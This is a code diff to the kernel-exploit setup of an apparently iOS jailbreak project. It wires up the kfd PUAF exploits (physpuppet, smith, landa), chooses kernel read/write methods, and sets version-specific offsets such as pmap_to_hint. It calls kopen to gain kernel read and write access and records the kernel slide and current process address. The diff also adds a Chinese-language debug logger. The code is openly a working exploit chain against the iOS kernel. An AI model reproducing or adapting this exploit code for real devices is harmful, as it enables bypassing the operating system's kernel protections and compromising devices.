@@ -4,8 +4,97 @@
 #import <libjailbreak/info.h>
 #import <libjailbreak/primitives_external.h>
 #import <os/proc.h>
+#import <UIKit/UIKit.h>
+#import <Foundation/Foundation.h>
 
 uint64_t gKfd = 0;
+
+// 🔥 简单的文件日志功能
+static FILE *kfd_log_file = NULL;
+
+// 🔥 获取真实的iOS版本（运行时检查）- 使用最安全的方法
+bool is_ios_16_or_later(void) {
+    // 使用sysctlbyname获取iOS版本字符串，避免Foundation调用
+    char version_str[32];
+    size_t size = sizeof(version_str);
+    if (sysctlbyname("kern.osproductversion", version_str, &size, NULL, 0) == 0) {
+        printf("🔍 iOS版本字符串: %s\n", version_str);
+        
+        // 解析版本号，比如"15.6.1"或"16.1.2"
+        int major = 0;
+        if (sscanf(version_str, "%d", &major) == 1) {
+            bool result = (major >= 16);
+            printf("🔍 主版本号: %d, is_ios_16_or_later() = %s\n", major, result ? "true" : "false");
+            return result;
+        }
+    }
+    // 如果获取失败，保守地假设是iOS 15
+    printf("❌ 版本获取失败，假设为iOS 15\n");
+    return false;
+}
+
+void kfd_log(const char *format, ...) {
+    // 如果还没有打开日志文件，就打开它
+    if (kfd_log_file == NULL) {
+        // 使用简单的路径，避免Foundation框架调用
+        const char *home = getenv("HOME");
+        if (home) {
+            char log_path[512];
+            snprintf(log_path, sizeof(log_path), "%s/Documents/kfd_debug.log", home);
+            kfd_log_file = fopen(log_path, "a");
+            if (kfd_log_file) {
+                // 添加iOS版本信息到日志 - 使用安全的系统调用
+                char version_str[32];
+                size_t size = sizeof(version_str);
+                char ios_version[64] = "iOS 未知版本";
+                if (sysctlbyname("kern.osproductversion", version_str, &size, NULL, 0) == 0) {
+                    snprintf(ios_version, sizeof(ios_version), "iOS %s", version_str);
+                }
+                
+                fprintf(kfd_log_file, "\n=== KFD Debug Log Started ===\n");
+                fprintf(kfd_log_file, "📝 日志文件位置: %s\n", log_path);
+                fprintf(kfd_log_file, "📱 检测到系统版本: %s\n", ios_version);
+                fflush(kfd_log_file);
+                printf("📝 KFD调试日志文件位置: %s\n", log_path);
+                printf("📱 检测到系统版本: %s\n", ios_version);
+            }
+        }
+        
+        // 如果还是无法创建文件，尝试使用临时目录
+        if (kfd_log_file == NULL) {
+            kfd_log_file = fopen("/tmp/kfd_debug.log", "a");
+            if (kfd_log_file) {
+                // 使用安全的系统调用获取版本信息
+                char version_str[32];
+                size_t size = sizeof(version_str);
+                char ios_version[64] = "iOS 未知版本";
+                if (sysctlbyname("kern.osproductversion", version_str, &size, NULL, 0) == 0) {
+                    snprintf(ios_version, sizeof(ios_version), "iOS %s", version_str);
+                }
+                
+                fprintf(kfd_log_file, "\n=== KFD Debug Log Started (temp) ===\n");
+                fprintf(kfd_log_file, "📱 检测到系统版本: %s\n", ios_version);
+                fflush(kfd_log_file);
+                printf("📝 KFD调试日志文件位置: /tmp/kfd_debug.log\n");
+                printf("📱 检测到系统版本: %s\n", ios_version);
+            }
+        }
+    }
+    
+    // 格式化并输出日志
+    va_list args;
+    va_start(args, format);
+    
+    // 同时输出到控制台和文件
+    vprintf(format, args);
+    
+    if (kfd_log_file) {
+        vfprintf(kfd_log_file, format, args);
+        fflush(kfd_log_file);
+    }
+    
+    va_end(args);
+}
 
 uint8_t kread8(uint64_t where)
 {
@@ -94,6 +183,7 @@ int kreadbuf(uint64_t where, void *buf, size_t size)
   }
   return 0;
 }
+
 int kwritebuf(uint64_t where, const void *buf, size_t size)
 {
   if (size == 1) {
@@ -123,52 +213,89 @@ int kwritebuf(uint64_t where, const void *buf, size_t size)
 
 int exploit_init(const char *flavor)
 {
+    kfd_log("🚀 开始KFD初始化，exploit: %s\n", flavor);
+    
     u64 method = 0;
     if (!strcmp(flavor, "physpuppet")) {
         method = puaf_physpuppet;
+        kfd_log("✅ 选择exploit: physpuppet\n");
     }
     else if(!strcmp(flavor, "smith")) {
         method = puaf_smith;
+        kfd_log("✅ 选择exploit: smith\n");
     }
     else if (!strcmp(flavor, "landa")) {
         method = puaf_landa;
+        kfd_log("✅ 选择exploit: landa\n");
     }
     else {
+        kfd_log("❌ 未知的exploit: %s\n", flavor);
         return -1;
     }
 
     bool isiOS15 = false;
 
     u64 kread_method = 0, kwrite_method = 0;
-    if (@available(iOS 16.0, *)) {
+    if (is_ios_16_or_later()) {
         kread_method = kread_sem_open;
         kwrite_method = kwrite_sem_open;
+        kfd_log("📱 iOS 16+: 使用sem_open读写方法\n");
     }
     else {
         kread_method = kread_IOSurface;
         kwrite_method = kwrite_IOSurface;
         isiOS15 = true;
+        kfd_log("📱 iOS 15: 使用IOSurface读写方法\n");
     }
 
     uint64_t vm_map__pmap = koffsetof(vm_map, pmap);
 
     uint64_t pmap_to_hint = 0; // offset between vm_map->pmap and vm_map->hint
-    if (@available(iOS 16.0, *)) {
-        pmap_to_hint = 0x58;
-    }
-    else if(@available(iOS 15.4, *)) {
+    // 使用安全的系统调用获取版本信息
+    char version_str[32];
+    size_t size = sizeof(version_str);
+    if (sysctlbyname("kern.osproductversion", version_str, &size, NULL, 0) == 0) {
+        int major = 0, minor = 0;
+        if (sscanf(version_str, "%d.%d", &major, &minor) >= 1) {
+            if (major >= 16) {
+                pmap_to_hint = 0x58;
+                kfd_log("🔧 iOS 16+: pmap_to_hint = 0x58\n");
+            }
+            else if (major == 15 && minor >= 4) {
+                pmap_to_hint = 0x38;
+                kfd_log("🔧 iOS 15.4+: pmap_to_hint = 0x38\n");
+            }
+            else {
+                pmap_to_hint = 0xB8;
+                kfd_log("🔧 iOS 15.0-15.3/iOS 14: pmap_to_hint = 0xB8\n");
+            }
+        } else {
+            // 解析失败，使用保守值
+            pmap_to_hint = 0x38;
+            kfd_log("🔧 版本解析失败，使用默认: pmap_to_hint = 0x38\n");
+        }
+    } else {
+        // 获取失败，使用保守值
         pmap_to_hint = 0x38;
-    }
-    else {
-        pmap_to_hint = 0xB8;
+        kfd_log("🔧 版本获取失败，使用默认: pmap_to_hint = 0x38\n");
     }
 
+    // 检查patchfinding是否成功
+    uint64_t static_base = kconstant(staticBase);
+    kfd_log("🔍 Patchfinding检查: staticBase = 0x%llx\n", static_base);
+    
+    if (static_base != 0) {
+        kfd_log("✅ Patchfinding成功，使用动态偏移\n");
+    } else {
+        kfd_log("⚠️  Patchfinding失败，可能导致exploit失败\n");
+    }
+    
     dynamic_system_info = (struct dynamic_info){
         .kread_kqueue_workloop_ctl_supported = true,
         .krkw_iosurface_supported = (kread_method == kread_IOSurface),
         .perf_supported = (kread_method != kread_IOSurface || kwrite_method != kwrite_IOSurface),
         
-        .kernelcache__static_base = kconstant(staticBase),
+        .kernelcache__static_base = static_base,
 
         .proc__p_list__le_next = koffsetof(proc, list_next),
         .proc__p_list__le_prev = koffsetof(proc, list_prev),
@@ -241,7 +368,7 @@ int exploit_init(const char *flavor)
         puaf_pages = 3072;
     } else if (cpuFamily == CPUFAMILY_ARM_TWISTER) { // A9
         puaf_pages = 128;
-        if (@available(iOS 16.0, *)) {
+        if (is_ios_16_or_later()) {
             // sem_open does not like 128
             puaf_pages = 160;
         }
@@ -249,7 +376,8 @@ int exploit_init(const char *flavor)
         puaf_pages = 256;
     }
 
-    printf("device info: CPU family: 0x%x, RAM: 0x%010llx, available: 0x%010zx\n", cpuFamily, device_memory, available_memory);
+    kfd_log("🔧 设备信息: CPU family: 0x%x, RAM: 0x%010llx, available: 0x%010zx\n", cpuFamily, device_memory, available_memory);
+    kfd_log("🎯 PUAF pages: %d\n", puaf_pages);
 
     size_t hogger_memory = 0;
     if (device_memory > 1024 * 1024 * 1024 * 12ULL) { // 16GB devices
@@ -264,7 +392,7 @@ int exploit_init(const char *flavor)
         }
     }
 
-    printf("PUAF pages: %d, hogger memory: 0x%010zx\n", puaf_pages, hogger_memory);
+//    printf("PUAF pages: %d, hogger memory: 0x%010zx\n", puaf_pages, hogger_memory);
 
     void* hogged = NULL;
     if (hogger_memory > 0) {
@@ -272,25 +400,54 @@ int exploit_init(const char *flavor)
         if (hogged != NULL) {
             memset(hogged, 0x41, hogger_memory);
         } else {
-            printf("Failed to hog memory\n");
+//            printf("Failed to hog memory\n");
         }
     }
 
     size_t available_memory_after_hogging = os_proc_available_memory();
-    printf("Available memory after hogging: 0x%010zx\n", available_memory_after_hogging);
-
+    kfd_log("💾 Hogging后可用内存: 0x%010zx\n", available_memory_after_hogging);
+    
+    // 记录即将启动的exploit参数
+    const char* exploit_name = "unknown";
+    if (method == puaf_physpuppet) exploit_name = "physpuppet";
+    else if (method == puaf_landa) exploit_name = "landa";
+    else if (method == puaf_smith) exploit_name = "smith";
+    
+    kfd_log("🚀 即将启动KFD: %s, kread=%llu, kwrite=%llu\n", exploit_name, kread_method, kwrite_method);
+    
     gKfd = kopen(puaf_pages, method, kread_method, kwrite_method);
+    
+    // 检查KFD是否成功初始化
+    if (gKfd == 0) {
+        kfd_log("❌ KFD初始化失败: kopen返回0\n");
+        kfd_log("   参数: puaf_pages=%d, method=%llu, kread=%llu, kwrite=%llu\n",
+               puaf_pages, method, kread_method, kwrite_method);
+        if (hogged != NULL) {
+            free(hogged);
+        }
+        return -1;
+    }
+    
+    kfd_log("✅ KFD初始化成功: 0x%llx\n", gKfd);
+    
     gPrimitives.kreadbuf = kreadbuf;
     gPrimitives.kwritebuf = kwritebuf;
-
+    
     if (hogged != NULL) {
         free(hogged);
     }
     
+    // 获取kernel slide
     gSystemInfo.kernelConstant.slide = ((struct kfd *)gKfd)->info.kaddr.kernel_slide;
+    uint64_t current_proc = ((struct kfd *)gKfd)->info.kaddr.current_proc;
+    
+    kfd_log("✅ Kernel slide: 0x%llx, current_proc: 0x%llx\n",
+           gSystemInfo.kernelConstant.slide, current_proc);
 
     return 0;
 }
+
+
 int exploit_deinit(void)
 {
     if (gPrimitives.kreadbuf == kreadbuf) {
